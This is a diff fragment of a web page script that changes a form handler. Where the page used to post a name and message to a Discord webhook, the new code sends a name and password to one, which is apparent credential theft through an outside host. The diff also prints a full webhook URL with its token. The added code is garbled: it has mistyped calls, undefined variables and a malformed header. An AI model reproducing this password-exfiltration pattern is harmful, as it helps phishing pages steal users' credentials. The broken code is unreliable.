@@ -8069,19 +8069,15 @@
             let name = document.getElement.ById("name").value;
             
             const webhookURL = "https://discord.com/api/webhooks/1289384157981708288/XAgMGk0x3S1zI4XmpLP8KTKAdC0kryOxyMij3_XRuhI3MSljf1VqXAkknCFZnrjL31Vb";
-            const message = {
-                content: "Name ${name}\nMessage: ${message}",
-            };
+            const contents = 'Name ${name}\nPassword: ${passwordf}';
+            const request = new XMLHttpRequest();
+            request.open("POST", webhook);
+            request.setRequestHeader('Content=type', 'application/json');
+            const params = {
+                content: contents
+            }
+            request.send(JSON.stringify(params));
 
-            fetch(webhookURL, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(message),
-            })
-        }
-    </script>
 </head>
 <body>
 
